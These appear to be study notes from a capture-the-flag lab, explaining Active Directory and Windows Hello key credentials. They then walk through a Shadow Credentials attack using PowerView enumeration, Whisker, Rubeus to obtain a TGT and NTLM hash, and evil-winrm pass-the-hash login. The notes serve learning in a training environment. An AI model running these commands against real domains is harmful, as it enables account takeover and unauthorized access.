
## Centralized authentication system
> Can be thought of as a digital database, of users, groups, and computers with attributes and permissions

### Domain controller
> Heart of AD
- Handles data storage,
- authentication and,
- authorization

### Windows Hello for Business
- Uses public private key pairs for authentication.
- Keys linked to a pin/biometric
- ``msDS-KeyCredentialLink``is attribute where the public key is stored

### Process to create new certificate pair
1. Trusted Platform Module creates private and public key pair
2. Client makes request for certificate from Organization's Certificate issuing Authority
3. ``msDS-KeyCredentialLink`` is set with public key

### Authentication Process
1. DC decrypts pre-authentication data with value from ``msDS-KeyCredentialLink``
2. Certificate generated by DC then sent back to client
3. Client can use certificate

## Exploiting
### Enumeration
`PowerView` scripts
- `Find-InterestingDomainAcl -ResolveGuids` returns all the user's privileges
- `Where-Object { $_.IdentityReferenceName -eq "hr"}` filters for username "hr"
- `Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights` returns the current user, vulnerable user, and privileges
##### Output

IdentityReferenceName| ObjectDN | ActiveDirectoryRights
--------------------- |--------  |   ---------------------
hr                    | CN=vansprinkles,CN=Users,DC=AOC,DC=local |ListChildren, ReadProperty, GenericWrite

This means we can use `GenericWrite` to write to the `msDS-KeyCredentialLink` of the ObjectDNs. This is knows as the **Shadow Credentials Attack**

### Exploitation
1. Use `whisker add /target:vansprinkles` to simulate the enrollment of a malicious device which changes the `msDS-KeyCredentialLink` attribute. Returns a certificate used to  authenticate.
2. Ask for a TGT (session token) to impersonate target user
3. `.\Rubeus.exe asktgt /user:vansprinkles /certificate:[Certificate from 1] /password:[password from 1] /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show` Returns NTLM hash.
4. Use NTLM hash for pash the hash attack
5. Use `evil-winrm -i IP -u vansprinkles -H [Hash from 3]` Logs in to the target user



